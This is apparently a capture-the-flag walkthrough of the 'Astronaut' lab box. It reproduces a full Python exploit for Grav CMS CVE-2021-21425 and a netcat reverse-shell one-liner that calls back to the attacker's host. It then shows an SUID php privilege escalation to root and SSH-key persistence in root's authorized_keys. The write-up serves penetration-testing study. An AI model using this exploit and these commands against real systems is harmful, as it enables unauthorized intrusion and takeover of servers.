# Astronaut

## Proving Grounds: Practice
------

> Beginning with a typical service and version scan with nmap, we find that only ports 22 (ssh) and 80 (http) are open. Additionally we are informed that there is a directory listing available, notably grav-admin.

### Nmap Results
------

```nmap-output

$ nmap 192.168.228.12 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 17:05 EDT
Nmap scan report for 192.168.228.12
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)

80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
|-     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```
<br>

> Enumerating the website, we in fact find that there is a content management system in use, Grav-CMS.
<br>

<p align="center" width="100">
	<img width="33%" src="https://github.com/user-attachments/assets/0d45e3e0-b7ae-4582-9fb7-573951440855">
</p>

<br>

<p align="center" width="100">
	<img width="33%" src="https://github.com/user-attachments/assets/cc0904c2-185e-4a2b-a47d-6564ca5e889b">
</p>

> A quick search for related exploits turns up an interesting find. 


### GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)
------

```
https://github.com/CsEnox/CVE-2021-21425
```


### Exploit
------

```python

#!/usr/bin/python

import requests
from bs4 import BeautifulSoup
from time import sleep
import urllib.parse
import argparse

parser = argparse.ArgumentParser(description='Grav Admin 1.7.10 RCE')
parser.add_argument('-c', help='Command', required=True)
parser.add_argument('-t', help='URL (Eg: http://grav.local)', required=True)
args = parser.parse_args()

url = args.t
cmd = args.c
cmd = urllib.parse.quote(cmd)

session = requests.Session()

# Getting Nonce
r = session.get(url+'/admin')
soup = BeautifulSoup(r.text, features="lxml")
a = str(soup.findAll('input')[3])
nonce = a[47:79]

# Creating File
print("[*] Creating File")
payload = f'admin-nonce={nonce}&task=SaveDefault&data[custom_jobs][vwlya][command]=/usr/bin/echo&data[custom_jobs][vwlya][args]={cmd}&data[custom_jobs][vwlya][at]=%2a%20%2a%20%2a%20%2a%20%2a&data[custom_jobs][vwlya][output]=/tmp/shell.sh&data[status][vwlya]=enabled&data[custom_jobs][vwlya][output_mode]=overwrite'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = session.post(url+'/admin/config/scheduler',data=payload,headers=headers)

if "Invalid Security Token" in r.text:
	exit("Exploit failed :(")
else:
	print("Scheduled task created for file creation, wait one minute")
	sleep(60)

# Running File
print("[*] Running file")
payload = f'admin-nonce={nonce}&task=SaveDefault&data[custom_jobs][vwlya][command]=/bin/bash&data[custom_jobs][vwlya][args]=/tmp/shell.sh&data[custom_jobs][vwlya][at]=%2a%20%2a%20%2a%20%2a%20%2a&data[custom_jobs][vwlya][output]=&data[status][vwlya]=enabled&data[custom_jobs][vwlya][output_mode]=overwrite'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = session.post(url+'/admin/config/scheduler',data=payload,headers=headers)

if "Invalid Security Token" in r.text:
	exit("Exploit failed :(")
else:
	print("Scheduled task created for command, wait one minute")
	sleep(60)

print("Exploit completed")
```


> Setting our listener to port 4444. Then sending the exploit command.


<p align="center" width="100">
	<img width="33%" src="https://github.com/user-attachments/assets/ada695c3-222f-427f-961f-c7dee3ccdf58">
</p>

### Command Line
------

```
python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.21.153 4444 >/tmp/f' -t http://192.168.207.12/grav-admin
```
<br>

> We get a reverse shell, as www-data.
<br>

<p align="center" width="100">
	<img width="33%" src="https://github.com/user-attachments/assets/14e3bca3-8656-4e09-b26a-48b350817cb6">
</p>

### Stabilize Shell
------

```
export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
```
<p align="center" width="100">
	<img width="33%" src="https://github.com/user-attachments/assets/bb1e2a10-7faf-40fb-abd8-7ddfbf7a2f10">
</p>

> We cannot check for sudo rights on www-data because we don't have the password. But we can search for binaries that may have the SUID bit set.

### SUID Hunting
------

```
find / -perm -u=s 2>/dev/null
```
<br>

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/71cc304e-6c4b-4679-88a9-609b05ad1bba">
</p>


> Checking out the findings on GTFOBins php seems to be a great candidate for Privilege Escalation.


### Escalate Privileges
------

```shell
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/4bcce87e-17d0-4de1-9c29-1a4e3eed8e1a">
</p>


> Now that we have root access, we can submit the proof of pwnage. Additionally we can have persistence on the machine by adding our public key to the authorized_keys file, though that is unnecessary.


### Persistence via SSH

```
cd /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTNoNoNoB5vEuE2CVK/0/xPnhxWfBWGj" >> authorized_keys
```